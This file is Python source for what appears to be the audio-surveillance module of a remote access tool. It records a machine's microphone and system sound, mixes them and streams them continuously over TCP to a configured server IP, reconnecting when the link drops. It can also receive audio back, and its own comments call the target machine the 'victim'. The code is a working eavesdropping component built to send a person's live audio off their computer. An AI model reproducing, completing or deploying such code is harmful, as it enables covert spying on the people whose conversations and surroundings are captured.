import socket
import threading
import subprocess
import time
import pyaudio

# ── Audio-Mixer Helper ────────────────────────────────────────────────────────
# Wir mischen Mikrofon und PC-Sound lokal zusammen, um nur EINEN Stream
# über das Netzwerk zu schicken. Das verhindert Port-Kollisionen.
try:
    import audioop
    print("[+] Using audioop for efficient audio mixing", flush=True)
    def mix_audio_chunks(data1, data2):
        if len(data1) != len(data2):
            return data1 # Fallback bei unerwartetem Längenunterschied
        return audioop.add(data1, data2, 2) # 2 = 16-bit audio
except ImportError:
    print("[-] audioop not available (Python 3.13+), using slower array fallback", flush=True)
    import array
    def mix_audio_chunks(data1, data2):
        if len(data1) != len(data2):
            return data1
        arr1 = array.array('h', data1)
        arr2 = array.array('h', data2)
        for i in range(len(arr1)):
            val = arr1[i] + arr2[i]
            # Clipping verhindern (16-bit Limits)
            if val > 32767: val = 32767
            elif val < -32768: val = -32768
            arr1[i] = val
        return arr1.tobytes()

import config # type: ignore

_GLOBAL_PYAUDIO = pyaudio.PyAudio()

# ── audio stream state ────────────────────────────────────────────────────────
audio_monitoring_active = True
mic_input_active        = True
mic_playback_active     = True

# ── per-stream stop-flags & thread handles ────────────────────────────────────
_combined_thread = None
_combined_stop   = False
_mic_recv_thread = None

# ── audio constants ───────────────────────────────────────────────────────────
WIRE_RATE     = 44100
WIRE_CHANNELS = 2        # STEREO: Proper mixing of speaker + mic audio
WIRE_FORMAT   = pyaudio.paInt16
CHUNK         = 4096


# ── helpers ───────────────────────────────────────────────────────────────────

def _handshake(sock):
    """Send PC_NAME header and wait for server ACK."""
    try:
        sock.sendall((config.PC_NAME + "\n").encode("utf-8"))
        _ = sock.recv(8)
    except Exception:
        pass

def _get_audio_device(p, is_input: bool, preferred_name_terms=None, default_fallback: bool = True):
    device_type_str = "Input" if is_input else "Output"

    if preferred_name_terms:
        for i in range(p.get_device_count()):
            info     = p.get_device_info_by_index(i)
            name     = info.get("name", "").lower()
            channels = info["maxInputChannels"] if is_input else info["maxOutputChannels"]
            if channels > 0:
                for term in preferred_name_terms:
                    if term.lower() in name:
                        return info

    if not default_fallback:
        return None

    try:
        idx    = p.get_default_input_device_info()["index"] if is_input else p.get_default_output_device_info()["index"]
        device = p.get_device_info_by_index(idx)
        print(f"[+] Fallback to default {device_type_str} device: {device['name']}", flush=True)
        return device
    except Exception as e:
        print(f"[-] No default {device_type_str} device for fallback: {e}", flush=True)
    return None

def _get_loopback_device(p):
    device = _get_audio_device(
        p,
        is_input              = True,
        preferred_name_terms  = ["loopback", "stereo mix", "what u hear", "lautsprecher"],
        default_fallback      = True,  # CHANGED: Fallback to default input if loopback not found
    )
    if device:
        device["_fallback"] = False
        print(f"[+] Loopback device found: {device['name']}", flush=True)
        return device
    
    # If not found, try to get default OUTPUT device in loopback mode
    # This is a fallback for Windows where Stereo Mix might not be available
    try:
        default_output_idx = p.get_default_output_device_info()["index"]
        device = p.get_device_info_by_index(default_output_idx)
        device["_fallback"] = True
        device["_input_fallback"] = True  # Mark it's using output as input (loopback)
        print(f"[+] Using default output device as fallback for speaker capture: {device['name']}", flush=True)
        return device
    except Exception as e:
        print(f"[-] Could not get default output device fallback: {e}", flush=True)
    
    print("[-] No preferred loopback device found, trying WASAPI loopback...", flush=True)
    try:
        # Check if pyaudiowpatch is available for WASAPI loopback
        try:
            import pyaudiowpatch as pyaudio_wp
            has_pyaudiowpatch = True
        except ImportError:
            has_pyaudiowpatch = False
        
        if has_pyaudiowpatch:
            wasapi_info      = p.get_host_api_info_by_type(pyaudio.paWASAPI)
            default_speakers = p.get_device_info_by_index(wasapi_info["defaultOutputDevice"])
            try:
                test_stream = p.open(
                    format             = WIRE_FORMAT,
                    channels           = WIRE_CHANNELS,
                    rate               = WIRE_RATE,
                    input              = True,
                    input_device_index = default_speakers["index"],
                    frames_per_buffer  = CHUNK,
                    as_loopback        = True,
                )
                test_stream.close()
                default_speakers["_fallback"]   = False
                default_speakers["_as_loopback"] = True
                print(f"[+] WASAPI loopback successful: {default_speakers['name']}", flush=True)
                return default_speakers
            except Exception as ex:
                print(f"[-] WASAPI loopback failed: {ex}", flush=True)
        else:
            print(f"[-] pyaudiowpatch not available, skipping WASAPI loopback", flush=True)
    except Exception as e:
        print(f"[-] WASAPI not available: {e}", flush=True)

    print("[-] No loopback device found; falling back to default input device", flush=True)
    fallback = _get_audio_device(p, is_input=True, preferred_name_terms=None, default_fallback=True)
    if fallback:
        fallback["_fallback"] = True
    return fallback

def _open_input_stream(p, device_info):
    idx = device_info["index"]
    try:
        stream = p.open(
            format           = WIRE_FORMAT,
            channels         = WIRE_CHANNELS,
            rate             = WIRE_RATE,
            input            = True,
            input_device_index = idx,
            frames_per_buffer  = CHUNK,
        )
        print(f"[+] input stream opened at {WIRE_RATE} Hz on '{device_info['name']}'", flush=True)
        return stream, WIRE_RATE
    except Exception as e:
        print(f"[!] could not open input at {WIRE_RATE} Hz: {e}", flush=True)

    native = int(device_info.get("defaultSampleRate", 44100))
    print(f"[!] retrying at native rate {native} Hz (pitch may differ)", flush=True)
    stream = p.open(
        format             = WIRE_FORMAT,
        channels           = WIRE_CHANNELS,
        rate               = native,
        input              = True,
        input_device_index = idx,
        frames_per_buffer  = CHUNK,
    )
    print(f"[+] input stream opened at {native} Hz on '{device_info['name']}'", flush=True)
    return stream, native


# ── Combined Audio Stream (Speaker + Mic) ─────────────────────────────────────

def stream_combined_audio_socket(host: str = None, port: int = None) -> dict:
    global _combined_thread, _combined_stop

    if _combined_thread is not None and _combined_thread.is_alive():
        _combined_stop = True
        _combined_thread.join(timeout=2.0)
    _combined_stop = False

    if host is None: host = "127.0.0.1"
    if port is None: port = 50007

    def _combined_stream():
        p = _GLOBAL_PYAUDIO
        spk_stream = None
        mic_stream = None
        spk_rate = WIRE_RATE
        mic_rate = WIRE_RATE

        # 1. Speaker Stream Setup (Spiele, Musik, System-Sound) - STEREO
        spk_dev = _get_loopback_device(p)
        if spk_dev:
            open_kwargs = dict(
                format=WIRE_FORMAT, channels=2, rate=WIRE_RATE,  # STEREO for speaker
                input=True, input_device_index=spk_dev["index"], frames_per_buffer=CHUNK
            )
            if spk_dev.get("_as_loopback"):
                open_kwargs["as_loopback"] = True
            
            try:
                spk_stream = p.open(**open_kwargs)
                spk_rate = WIRE_RATE
                print(f"[+] Speaker stream opened STEREO on '{spk_dev['name']}' @ {WIRE_RATE}Hz", flush=True)
            except Exception as e:
                native = int(spk_dev.get("defaultSampleRate", 44100))
                open_kwargs["rate"] = native
                spk_rate = native
                # IMPORTANT: Keep as_loopback if it was set
                if not spk_dev.get("_as_loopback"):
                    open_kwargs.pop("as_loopback", None)  # Remove if it was there
                else:
                    open_kwargs["as_loopback"] = True  # Keep it
                try:
                    spk_stream = p.open(**open_kwargs)
                    print(f"[+] Speaker stream opened STEREO at native rate {native} Hz", flush=True)
                except Exception as e2:
                    print(f"[-] Failed to open speaker stream at native rate: {e2}", flush=True)
                    # Try one more time without as_loopback
                    open_kwargs.pop("as_loopback", None)
                    try:
                        spk_stream = p.open(**open_kwargs)
                        print(f"[+] Speaker stream opened STEREO (fallback mode) @ {native}Hz", flush=True)
                    except Exception as e3:
                        print(f"[-] Could not open speaker stream: {e3}", flush=True)

        # 2. Microphone Stream Setup - MONO
        mic_dev = _get_audio_device(p, is_input=True, preferred_name_terms=["microphone", "mikrofon", "mic", "input"], default_fallback=True)
        mic_stream = None
        if mic_dev:
            try:
                # Open mic as MONO at WIRE_RATE
                mic_stream = p.open(
                    format=WIRE_FORMAT, channels=1, rate=WIRE_RATE,  # MONO for mic
                    input=True, input_device_index=mic_dev["index"],
                    frames_per_buffer=CHUNK
                )
                mic_rate = WIRE_RATE
                print(f"[+] Mic stream opened MONO on '{mic_dev['name']}' @ {WIRE_RATE}Hz", flush=True)
            except Exception as e:
                print(f"[-] Failed to open mic stream: {e}", flush=True)
                try:
                    native = int(mic_dev.get("defaultSampleRate", 44100))
                    mic_stream = p.open(
                        format=WIRE_FORMAT, channels=1, rate=native,
                        input=True, input_device_index=mic_dev["index"],
                        frames_per_buffer=CHUNK
                    )
                    mic_rate = native
                    print(f"[+] Mic stream opened MONO at native rate {native} Hz", flush=True)
                except Exception as e2:
                    print(f"[-] Failed to open mic stream at any rate: {e2}", flush=True)

        if not spk_stream and not mic_stream:
            print("[-] Keine Audioquellen gefunden. Abbruch.", flush=True)
            return

        print(f"[+] Combined (Speaker STEREO + Mic MONO) streaming → {host}:{port}", flush=True)
        
        # Diagnostics: Track what sources are available
        spk_available = spk_stream is not None
        mic_available = mic_stream is not None
        print(f"[+] Audio sources: Speaker={spk_available}, Mic={mic_available}", flush=True)

        sock = None
        retry_count = 0
        max_retries = 5
        
        # Diagnostics: Track data flow
        frames_sent = 0
        spk_frames = 0
        mic_frames = 0
        silent_spk_count = 0

        while audio_monitoring_active and not _combined_stop:
            try:
                if sock is None:
                    if retry_count >= max_retries:
                        print("[-] Maximale Verbindungsversuche erreicht.", flush=True)
                        break
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)  # 64KB send buffer
                    sock.settimeout(5)
                    sock.connect((host, port))
                    _handshake(sock)
                    sock.settimeout(None)
                    retry_count = 0
                    print(f"[+] Connected to {host}:{port}", flush=True)

                # Read from speaker (STEREO) - ~8KB for 4096 samples at 16-bit stereo
                spk_data = None
                if spk_stream:
                    try:
                        spk_data = spk_stream.read(CHUNK, exception_on_overflow=False)
                        # Check if speaker data is silent (all zeros)
                        if spk_data and all(b == 0 for b in spk_data[:100]):  # Check first 100 bytes
                            silent_spk_count += 1
                            if silent_spk_count > 100 and silent_spk_count % 100 == 0:
                                print(f"[!] WARNING: Speaker stream is silent (100+ frames). Stereo Mix may be disabled.", flush=True)
                                print(f"[!] Run 'python audio_diagnostics.py' to see how to enable Stereo Mix", flush=True)
                        else:
                            silent_spk_count = 0  # Reset counter if we get non-silent data
                            spk_frames += 1
                    except Exception as spk_err:
                        pass

                # Read from mic (MONO) - ~4KB for 4096 samples at 16-bit mono
                mic_data = None
                if mic_stream:
                    try:
                        mic_data = mic_stream.read(CHUNK, exception_on_overflow=False)
                        if mic_data:
                            mic_frames += 1
                    except Exception as mic_err:
                        pass

                # MIX: Combine STEREO speaker + MONO mic
                # Convert mono mic to stereo by duplicating channels and amplifying
                output_data = None
                
                if spk_data and mic_data:
                    import array
                    # Parse speaker (stereo)
                    spk_arr = array.array('h', spk_data)
                    # Parse mic (mono) and duplicate to stereo + amplify 2x
                    mic_arr = array.array('h', mic_data)
                    mic_stereo = array.array('h')
                    for sample in mic_arr:
                        # Amplify mic by 2x and clip to prevent distortion
                        amplified = int(sample * 2.0)
                        if amplified > 32767: amplified = 32767
                        elif amplified < -32768: amplified = -32768
                        mic_stereo.append(amplified)
                        mic_stereo.append(amplified)  # Duplicate to stereo
                    
                    # Mix speaker + mic stereo
                    output = array.array('h')
                    for i in range(len(spk_arr)):
                        val = spk_arr[i] + mic_stereo[i]
                        if val > 32767: val = 32767
                        elif val < -32768: val = -32768
                        output.append(val)
                    output_data = output.tobytes()
                    
                elif spk_data:
                    output_data = spk_data
                elif mic_data:
                    # Convert mono mic to stereo for output
                    import array
                    mic_arr = array.array('h', mic_data)
                    output = array.array('h')
                    for sample in mic_arr:
                        amplified = int(sample * 2.0)
                        if amplified > 32767: amplified = 32767
                        elif amplified < -32768: amplified = -32768
                        output.append(amplified)
                        output.append(amplified)  # Duplicate to stereo
                    output_data = output.tobytes()

                if output_data:
                    sock.sendall(output_data)
                    frames_sent += 1

            except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                retry_count += 1
                print(f"[-] Socket error: {e}; reconnecting ({retry_count}/{max_retries})…", flush=True)
                try: sock.close()
                except: pass
                sock = None
                time.sleep(1)
            except Exception as e:
                print(f"[-] Unexpected error: {e}", flush=True)
                time.sleep(0.1)

        if sock:
            try: sock.close()
            except: pass
        if spk_stream:
            spk_stream.stop_stream()
            spk_stream.close()
        if mic_stream:
            mic_stream.stop_stream()
            mic_stream.close()
        
        print("[-] Combined socket streaming stopped", flush=True)
        print(f"[📊] Audio Session Summary:", flush=True)
        print(f"    Total frames sent: {frames_sent}", flush=True)
        print(f"    Frames with speaker: {spk_frames}", flush=True)
        print(f"    Frames with mic: {mic_frames}", flush=True)
        if spk_frames == 0:
            print(f"    ⚠️  WARNING: No speaker data was captured!", flush=True)
            print(f"    💡 Desktop audio (games, music) requires 'Stereo Mix' to be enabled.", flush=True)
            print(f"    📝 Run 'python audio_diagnostics.py' to see how to enable it.", flush=True)

    t = threading.Thread(target=_combined_stream, daemon=True)
    t.start()
    _combined_thread = t
    return {"status": "success", "message": f"Combined audio streaming started → {host}:{port}"}


# ── public API ────────────────────────────────────────────────────────────────

def toggle_audio_monitor(action: str, host: str = None, port: int = None) -> dict:
    global audio_monitoring_active, mic_input_active, mic_playback_active, _combined_stop
    if action == "start":
        audio_monitoring_active = True
        mic_playback_active     = False
        AUDIO_SERVER_HOST = host or config.SERVER_IP_ADDR
        AUDIO_SERVER_PORT = port or 50007
        
        # Startet nun EINEN gemeinsamen Stream anstatt zwei kollidierender
        result = stream_combined_audio_socket(AUDIO_SERVER_HOST, AUDIO_SERVER_PORT)
        print(f"[*] Audio Monitor gestartet: {result['message']}", flush=True)
        return result
    else:
        audio_monitoring_active = False
        mic_input_active        = False
        mic_playback_active     = False
        _combined_stop          = True
        return {"status": "success", "message": "Audio monitor stopped"}

def start_full_audio_stream(host: str = None, port: int = None) -> dict:
    global mic_playback_active
    mic_playback_active = False

    AUDIO_SERVER_HOST = host or config.SERVER_IP_ADDR
    AUDIO_SERVER_PORT = port or 50007

    return stream_combined_audio_socket(AUDIO_SERVER_HOST, AUDIO_SERVER_PORT)


# ── server → victim playback (receive_mic_from_socket) ───────────────────────

def receive_mic_from_socket(host: str, port: int) -> dict:
    _socket_mod    = socket
    _thread_module = threading

    def _play_stream():
        try:
            p       = _GLOBAL_PYAUDIO
            stream  = p.open(
                format            = WIRE_FORMAT,
                channels          = WIRE_CHANNELS,
                rate              = WIRE_RATE,
                output            = True,
                frames_per_buffer = CHUNK,
            )
            print(f"[+] Mic-receiver connecting to {host}:{port}", flush=True)
            with _socket_mod.socket(_socket_mod.AF_INET, _socket_mod.SOCK_STREAM) as s:
                s.setsockopt(_socket_mod.SOL_SOCKET, _socket_mod.SO_REUSEADDR, 1)
                try:
                    s.settimeout(0.5)
                    s.connect((host, port))
                    while mic_playback_active:
                        try:
                            data = s.recv(CHUNK * 2)
                        except _socket_mod.timeout:
                            continue
                        if not data:
                            break
                        stream.write(data)
                except Exception as e:
                    print(f"[-] Playback stream error: {e}", flush=True)
            stream.stop_stream()
            stream.close()
            print("[-] Mic playback stopped", flush=True)
        except Exception as e:
            print(f"[-] Mic playback fatal error: {e}", flush=True)

    try:
        t = _thread_module.Thread(target=_play_stream, daemon=True)
        t.start()
        global _mic_recv_thread
        _mic_recv_thread = t
        return {"status": "success", "message": f"Listening to client mic on {host}:{port}"}
    except Exception as e:
        return {"status": "error", "message": str(e)}